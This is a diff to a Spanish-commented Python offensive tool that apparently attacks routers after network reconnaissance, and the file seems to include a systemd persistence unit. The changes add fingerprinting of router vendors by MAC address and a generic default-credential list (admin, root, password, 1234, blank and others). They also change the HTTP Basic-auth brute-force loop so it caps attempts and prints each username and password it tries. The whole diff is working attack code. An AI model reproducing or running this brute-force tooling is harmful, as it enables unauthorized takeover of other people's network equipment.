@@ -3438,7 +3438,18 @@ WantedBy=multi-user.target
                 
                 print(f"✅ Acceso al router configurado: {gateway}")
             else:
-                print(f"❌ No se pudo acceder al router: {gateway}")
+                print(f"⚠️ No se encontraron credenciales para el router {gateway}")
+                print(f"   🔄 Continuando con otros objetivos...")
+                
+                # Agregar entrada de router no accesible para el reporte
+                router_access.append({
+                    'gateway': gateway,
+                    'router_type': router_type,
+                    'credentials': None,
+                    'configuration': None,
+                    'status': 'no_credentials',
+                    'timestamp': time.time()
+                })
             
         except Exception as e:
             print(f"❌ Error accediendo al router: {e}")
@@ -3514,11 +3525,67 @@ WantedBy=multi-user.target
                 except Exception:
                     continue
             
-            return 'unknown'
+            # Si no se puede detectar, usar detección por MAC vendor
+            print(f"   ⚠️ No se pudo detectar tipo de router por HTTP, intentando por MAC...")
+            return self._detect_router_type_by_mac(gateway)
             
         except Exception as e:
             print(f"❌ Error detectando tipo de router: {e}")
-            return 'unknown'
+            print(f"   ⚠️ Usando detección por MAC como respaldo...")
+            return self._detect_router_type_by_mac(gateway)
+    
+    def _detect_router_type_by_mac(self, gateway: str) -> str:
+        """Detectar tipo de router usando MAC vendor como respaldo"""
+        try:
+            # Obtener hosts descubiertos del reconocimiento
+            hosts = self.report['phase_1_reconnaissance'].get('hosts_discovered', [])
+            
+            for host in hosts:
+                if host.get('ip') == gateway:
+                    vendor = host.get('vendor', '').lower()
+                    mac = host.get('mac', '')
+                    
+                    print(f"   🔍 Analizando MAC: {mac} - Vendor: {vendor}")
+                    
+                    # Mapear vendors a tipos de router
+                    if 'huawei' in vendor:
+                        print(f"   ✅ Router Huawei detectado por MAC")
+                        return 'huawei'
+                    elif 'cisco' in vendor:
+                        print(f"   ✅ Router Cisco detectado por MAC")
+                        return 'cisco'
+                    elif 'tp-link' in vendor or 'tplink' in vendor:
+                        print(f"   ✅ Router TP-Link detectado por MAC")
+                        return 'tp-link'
+                    elif 'netgear' in vendor:
+                        print(f"   ✅ Router Netgear detectado por MAC")
+                        return 'netgear'
+                    elif 'linksys' in vendor:
+                        print(f"   ✅ Router Linksys detectado por MAC")
+                        return 'linksys'
+                    elif 'asus' in vendor:
+                        print(f"   ✅ Router Asus detectado por MAC")
+                        return 'asus'
+                    elif 'd-link' in vendor or 'dlink' in vendor:
+                        print(f"   ✅ Router D-Link detectado por MAC")
+                        return 'd-link'
+                    elif 'belkin' in vendor:
+                        print(f"   ✅ Router Belkin detectado por MAC")
+                        return 'belkin'
+                    elif 'zte' in vendor:
+                        print(f"   ✅ Router ZTE detectado por MAC")
+                        return 'zte'
+                    else:
+                        print(f"   ⚠️ Vendor desconocido: {vendor}, usando genérico")
+                        return 'generic_router'
+            
+            # Si no se encuentra en hosts, usar genérico
+            print(f"   ⚠️ No se encontró información de MAC para {gateway}, usando genérico")
+            return 'generic_router'
+            
+        except Exception as e:
+            print(f"❌ Error en detección por MAC: {e}")
+            return 'generic_router'
     
     def _brute_force_router_credentials(self, gateway: str) -> Optional[Dict[str, str]]:
         """Fuerza bruta específica para routers con credenciales dirigidas"""
@@ -3552,10 +3619,34 @@ WantedBy=multi-user.target
                 print("   🎯 Usando credenciales específicas para TP-Link...")
                 users_to_try.extend(self.config_data['credentials']['tplink_users'])
                 passwords_to_try.extend(self.config_data['credentials']['tplink_passwords'])
+            elif router_type == 'generic_router':
+                print("   🎯 Usando credenciales genéricas para router...")
+                # Agregar credenciales genéricas comunes
+                users_to_try.extend(['admin', 'root', 'user', 'administrator', 'guest'])
+                passwords_to_try.extend(['admin', 'password', '1234', '12345', '123456', '', 'root', 'user'])
+            else:
+                print(f"   🎯 Usando credenciales estándar para {router_type}...")
+            
+            # Limitar número de intentos para evitar timeouts largos
+            max_attempts = 50
+            attempt_count = 0
             
             for login_url in login_urls:
+                if attempt_count >= max_attempts:
+                    print(f"   ⚠️ Límite de intentos alcanzado ({max_attempts}), continuando...")
+                    break
+                    
                 for username in users_to_try:
+                    if attempt_count >= max_attempts:
+                        break
+                        
                     for password in passwords_to_try:
+                        if attempt_count >= max_attempts:
+                            break
+                            
+                        attempt_count += 1
+                        print(f"   🔑 Intentando {username}:{password} ({attempt_count}/{max_attempts})")
+                        
                         try:
                             # Crear autenticación básica
                             auth_string = f"{username}:{password}"
@@ -3567,7 +3658,7 @@ WantedBy=multi-user.target
                             req.add_header('Authorization', f'Basic {auth_b64}')
                             req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                             
-                            with urllib.request.urlopen(req, timeout=5) as response:
+                            with urllib.request.urlopen(req, timeout=3) as response:
                                 if response.status == 200:
                                     # Verificar si realmente accedió
                                     content = response.read().decode('utf-8', errors='ignore')
@@ -3578,9 +3669,12 @@ WantedBy=multi-user.target
                         except urllib.error.HTTPError as e:
                             if e.code == 401:  # Unauthorized
                                 continue
-                        except Exception:
+                        except Exception as e:
+                            # Continuar sin mostrar errores individuales
                             continue
             
+            print(f"   ⚠️ No se encontraron credenciales válidas para el router {gateway}")
+            print(f"   📊 Intentos realizados: {attempt_count}")
             return None
             
         except Exception as e:
